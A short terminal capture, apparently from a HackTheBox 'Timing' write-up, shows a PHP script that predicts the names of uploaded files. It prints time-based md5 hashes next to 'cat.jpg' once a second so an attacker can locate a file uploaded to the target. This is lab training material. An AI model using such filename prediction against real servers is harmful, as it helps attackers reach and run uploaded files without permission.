```php
3cat@kali:~/Desktop/HTB/Timing$ cat timingboi.php
<?php
while(true){
$file_hash = uniqid();
$file_name = "cat.jpg";

$payload = md5('$file_hash' . time()) . '_' . $file_name;
echo date("D M j G:i:s T Y");
echo " = ";
echo $payload;
echo "\n";
sleep(1);
}
?>
```
